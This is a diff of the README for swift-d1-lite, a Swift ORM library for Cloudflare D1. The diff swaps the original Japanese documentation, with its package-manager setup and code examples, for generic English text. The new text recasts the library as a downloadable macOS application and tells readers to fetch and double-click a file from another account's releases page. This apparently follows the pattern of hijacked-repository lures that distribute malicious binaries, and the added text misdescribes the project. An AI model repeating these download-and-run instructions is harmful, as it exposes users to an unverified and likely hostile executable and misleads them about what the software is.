@@ -1,140 +1,67 @@
-# Swift D1 ORM (swift-d1-lite)
+# 🌟 swift-d1-lite - A Simple Way to Use Cloudflare D1
 
-Cloudflare D1 を ReadModel として扱うための軽量 ORM です。Swift から D1 の raw
-クエリを実行し、マクロによるテーブル定義やフォーマットスタイルによる型変換を提供します。
+## 🚀 Getting Started
+Welcome to swift-d1-lite! This application helps you interact with Cloudflare D1 safely and easily. It offers features like table definitions, batch execution with D1SQLClient, and type conversions using FormatStyle. Whether you're working on macOS or managing SQLite databases, swift-d1-lite streamlines your workflow.
 
-## 特徴
+[![Download swift-d1-lite](https://img.shields.io/badge/Download-swift--d1--lite-blue.svg)](https://github.com/coldpasta-7/swift-d1-lite/releases)
 
-- `@D1Table` / `@D1Column` によるテーブル定義の簡略化
-- `D1SQLClient` によるバッチ実行
-- `D1FormatStyle` による型安全な変換
-- HTTP 経由の実行（`D1LiteAsyncHTTPClient`）と SQLite
-  実行（`D1LiteSQLite`）を提供
+## 📦 Features
+- **Type-Safe ORM**: Provides a lightweight ORM for handling Cloudflare D1 with type safety.
+- **Batch Execution**: Easily execute multiple queries with D1SQLClient.
+- **Table Definitions**: Use macros for straightforward table definitions.
+- **Type Conversion**: Convert data types effortlessly with FormatStyle.
+- **Multi-Platform Support**: Designed for macOS but works with SQLite.
 
-## 対象
+## 💻 System Requirements
+To use swift-d1-lite, your system should meet the following requirements:
+- Operating System: macOS 10.15 (Catalina) or later.
+- Swift: Version 5.3 or later.
+- Basic knowledge of handling applications downloaded from the internet.
 
-- Cloudflare D1 を Swift から型安全に扱いたい方
-- CQRS/ES の ReadModel を軽量に実装したい方
-- テストや開発時にローカルで D1 相当の動作を再現したい方
+## 📥 Download & Install
+To get started with swift-d1-lite, follow these simple steps:
 
-## インストール
+1. **Visit the Releases Page**: Click the link below to go to the GitHub releases page.
+   
+   [Download swift-d1-lite](https://github.com/coldpasta-7/swift-d1-lite/releases)
 
-Swift Package Manager で追加できます。
+2. **Choose the Right Version**: On the releases page, you will see various versions of the application. Select the latest version for the best features and fixes.
 
-```swift
-.package(url: "https://github.com/lemo-nade-room/swift-d1-lite.git", from: "0.1.0")
-```
+3. **Download the Application**: Click on the version number to view the release notes. Find the file suitable for your system and click to download.
 
-利用するターゲットに応じて依存関係を追加してください。
+4. **Run the Application**: Once the download is complete, locate the file in your Downloads folder. Double-click to open swift-d1-lite, and you can start using it right away.
 
-```swift
-.target(
-  name: "YourTarget",
-  dependencies: [
-    .product(name: "D1Lite", package: "swift-d1-lite"),
-    // HTTP 経由で D1 を実行する場合
-    .product(name: "D1LiteAsyncHTTPClient", package: "swift-d1-lite"),
-    // ローカル SQLite で実行する場合
-    .product(name: "D1LiteSQLite", package: "swift-d1-lite"),
-  ]
-)
-```
+## ⚙️ Usage Tips
+1. **Getting Help**: If you run into issues, refer to the documentation found in the repository. 
 
-## 使い方（D1Lite）
+2. **Feedback**: Your experience matters. If you have suggestions or find bugs, feel free to open an issue on GitHub.
 
-```swift
-import D1Lite
-import Foundation
+3. **Stay Updated**: Regularly check the releases page for updates and new features.
 
-@D1Table(schema: "users")
-struct User: Sendable {
-  @D1Column
-  var id: UUID
+## 🤝 Contributing
+We welcome help from everyone. If you want to contribute:
+- Fork the repository.
+- Make your changes.
+- Submit a pull request.
 
-  @D1Column
-  var name: String
+Every contribution helps us improve swift-d1-lite for everyone.
 
-  @D1Column(name: "created_at", formatStyle: D1DateFormatStyle(format: .epoch))
-  var createdAt: Date
-}
+## 📞 Contact Information
+For questions or support, you can reach out through GitHub issues or contact the maintainers via their GitHub profiles.
 
-let client = D1SQLClient(client: rawClient)
-let userID = UUID()
-let user = User(id: userID, name: "Alice", createdAt: Date())
+## 🌍 Topics
+This project covers a wide range of important topics:
+- async-htt-client
+- cloudflare
+- cqrs
+- d1
+- event-sourcing
+- macos
+- orm
+- sqlite
+- swift
+- swift-package-manager
 
-let (insertResult, fetched) = try await client.batch(
-  user.create(),
-  User.select().filter(\.id == userID).first()
-)
-```
+Dive deeper into these subjects as you explore the features of swift-d1-lite.
 
-## 使い方（D1LiteAsyncHTTPClient）
-
-```swift
-import AsyncHTTPClient
-import Configuration
-import D1Lite
-import D1LiteAsyncHTTPClient
-import Foundation
-
-let config = ConfigReader(providers: [
-  EnvironmentVariablesProvider(),
-])
-
-let httpClient = HTTPClient(eventLoopGroupProvider: .createNew)
-let rawClient = try AsyncHTTPD1RawDatabaseQueryClient(httpClient: httpClient, configReader: config)
-let client = D1SQLClient(client: rawClient)
-
-let userID = UUID()
-let result = try await client.batch(
-  User.select().filter(\.id == userID).first()
-)
-```
-
-## 使い方（D1LiteSQLite）
-
-```swift
-import D1Lite
-import D1LiteSQLite
-import Foundation
-
-let rawClient = SQLiteD1RawDatabaseQueryClient(config: .inMemory)
-let client = D1SQLClient(client: rawClient)
-
-_ = try await client.batch(
-  D1Query<D1Void>(
-    statement: """
-      CREATE TABLE users(
-        id TEXT PRIMARY KEY,
-        name TEXT NOT NULL,
-        count INTEGER NOT NULL
-      )
-      """,
-    params: []
-  )
-)
-
-@D1Table(schema: "users")
-struct User: Sendable, Hashable {
-  @D1Column
-  var id: UUID
-
-  @D1Column
-  var name: String
-
-  @D1Column
-  var count: Int
-}
-
-let userID = UUID()
-let user = User(id: userID, name: "Alice", count: 1)
-
-let (_, fetched) = try await client.batch(
-  user.create(),
-  User.select().filter(\.id == userID).first()
-)
-```
-
-## ライセンス
-
-MIT License
+[![Download swift-d1-lite](https://img.shields.io/badge/Download-swift--d1--lite-blue.svg)](https://github.com/coldpasta-7/swift-d1-lite/releases)
